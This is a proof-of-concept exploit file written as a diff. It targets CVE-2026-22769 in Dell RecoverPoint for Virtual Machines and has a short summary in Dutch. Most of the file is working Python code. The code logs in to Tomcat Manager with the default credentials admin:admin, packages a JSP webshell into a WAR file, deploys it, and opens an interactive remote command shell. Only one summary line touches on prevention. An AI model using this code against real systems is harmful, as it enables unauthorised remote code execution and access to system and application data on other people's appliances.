@@ -1,0 +1,200 @@
+=============================================================================================================================================
+| # Title     : Dell RecoverPoint for Virtual Machines RCE                                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.dell.com/en-us/lp/dt/data-protection-suite-recoverpoint-for-virtual-machines                                    |
+=============================================================================================================================================
+
+[+] Summary    :  PoC exploiteert standaard Tomcat Manager credentials (admin:admin) om een kwaadaardig WAR-bestand met een JSP-webshell te uploaden en uitvoeren op Dell RecoverPoint-appliances. 
+                  Dit kan leiden tot volledige remote code execution (RCE) en ongeautoriseerde toegang tot systeem- en applicatiegegevens. 
+                  Preventie omvat het verwijderen van standaardaccounts, beperken van Tomcat Manager-toegang, sterke wachtwoorden en monitoring van deployment logs.
+
+[+] POC   :
+
+#!/usr/bin/env python3
+
+import requests
+import sys
+import base64
+import argparse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+# Default credentials found in /home/kos/tomcat9/tomcat-users.xml
+DEFAULT_USERNAME = "admin"
+DEFAULT_PASSWORD = "admin"  # or whatever the hardcoded default is - adjust based on actual discovery
+
+JSP_WEBSHELL = '''
+<%@ page import="java.util.*,java.io.*"%>
+<%
+    if (request.getParameter("cmd") != null) {
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while (disr != null) {
+            out.println(disr);
+            disr = dis.readLine();
+        }
+    }
+%>
+'''
+
+def create_malicious_war(war_name="shell.war", shell_name="shell.jsp"):
+    """
+    Creates a simple WAR file containing a JSP webshell
+    """
+    import tempfile
+    import os
+    import zipfile
+    import uuid
+    
+    temp_dir = tempfile.mkdtemp()
+    war_path = os.path.join(temp_dir, war_name)
+
+    web_inf = os.path.join(temp_dir, "WEB-INF")
+    os.makedirs(web_inf, exist_ok=True)
+
+    web_xml = os.path.join(web_inf, "web.xml")
+    with open(web_xml, 'w') as f:
+        f.write('''<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://java.sun.com/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee 
+                             http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
+         version="3.0">
+    <display-name>Malicious</display-name>
+    <welcome-file-list>
+        <welcome-file>shell.jsp</welcome-file>
+    </welcome-file-list>
+</web-app>''')
+
+    jsp_path = os.path.join(temp_dir, shell_name)
+    with open(jsp_path, 'w') as f:
+        f.write(JSP_WEBSHELL)
+
+    with zipfile.ZipFile(war_path, 'w', zipfile.ZIP_DEFLATED) as war:
+
+        war.write(web_xml, arcname="WEB-INF/web.xml")
+        war.write(jsp_path, arcname=shell_name)
+    
+    return war_path
+
+def exploit(target_url, war_file, deploy_path="/shell"):
+    """
+    Exploit the vulnerability by uploading and deploying malicious WAR
+    """
+    print(f"[*] Targeting: {target_url}")
+    print(f"[*] Using default credentials: {DEFAULT_USERNAME}:{DEFAULT_PASSWORD}")
+
+    session = requests.Session()
+    session.auth = (DEFAULT_USERNAME, DEFAULT_PASSWORD)
+    session.verify = False 
+
+    try:
+        status_url = f"{target_url}/manager/status"
+        r = session.get(status_url, timeout=10)
+        if r.status_code == 200:
+            print("[+] Authentication successful! Default credentials work.")
+        elif r.status_code == 401:
+            print("[-] Authentication failed. Default credentials rejected.")
+            return False
+        else:
+            print(f"[?] Unexpected response code: {r.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Connection error: {e}")
+        return False
+
+    print(f"[*] Uploading malicious WAR to {deploy_path}")
+    
+    deploy_url = f"{target_url}/manager/text/deploy"
+    
+    with open(war_file, 'rb') as f:
+        war_content = f.read()
+
+    files = {
+        'file': (war_file, war_content, 'application/octet-stream')
+    }
+    
+    params = {
+        'path': deploy_path,
+        'update': 'true'
+    }
+    
+    try:
+        r = session.put(deploy_url, params=params, files=files, timeout=30)
+        
+        if r.status_code == 200:
+            print(f"[+] WAR deployed successfully to {deploy_path}")
+            print(f"[+] Web shell available at: {target_url}{deploy_path}/shell.jsp")
+            print("[*] Example command: curl -k '{}{}/shell.jsp?cmd=id'".format(
+                target_url, deploy_path))
+            return True
+        else:
+            print(f"[-] Deployment failed. Response code: {r.status_code}")
+            print(f"[-] Response body: {r.text[:200]}")
+            return False
+            
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error during deployment: {e}")
+        return False
+
+def interactive_shell(target_url, shell_path):
+    """
+    Simple interactive shell via the uploaded JSP webshell
+    """
+    print("[*] Entering interactive shell (type 'exit' to quit)")
+    
+    while True:
+        cmd = input("$> ")
+        if cmd.lower() == 'exit':
+            break
+        
+        params = {'cmd': cmd}
+        try:
+            r = requests.get(f"{target_url}{shell_path}", params=params, 
+                           verify=False, timeout=10)
+            if r.status_code == 200:
+                print(r.text.strip())
+            else:
+                print(f"[-] Command failed: HTTP {r.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error: {e}")
+
+def main():
+    parser = argparse.ArgumentParser(description='CVE-2026-22769 PoC Exploit By indoushka')
+    parser.add_argument('target', help='Target URL (e.g., https://192.168.1.100:8443)')
+    parser.add_argument('--deploy-path', default='/shell', 
+                       help='Deployment path for WAR (default: /shell)')
+    parser.add_argument('--interactive', '-i', action='store_true',
+                       help='Launch interactive shell after exploitation')
+    
+    args = parser.parse_args()
+    
+    print("=== CVE-2026-22769 Dell RecoverPoint RCE PoC By indoushka ===")
+    print("Based on Mandiant/GTIG research\n")
+
+    print("[*] Creating malicious WAR payload...")
+    war_file = create_malicious_war()
+    print(f"[+] WAR created: {war_file}")
+
+    if exploit(args.target, war_file, args.deploy_path):
+        print("\n[+] Exploit successful!")
+        
+        if args.interactive:
+            shell_url = f"{args.target}{args.deploy_path}/shell.jsp"
+            interactive_shell(args.target, f"{args.deploy_path}/shell.jsp")
+    else:
+        print("\n[-] Exploit failed.")
+
+    print("\n[*] Note: The created WAR file remains on the target")
+    print("[*] Location: /var/lib/tomcat9")
+
+if __name__ == "__main__":
+    main()
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
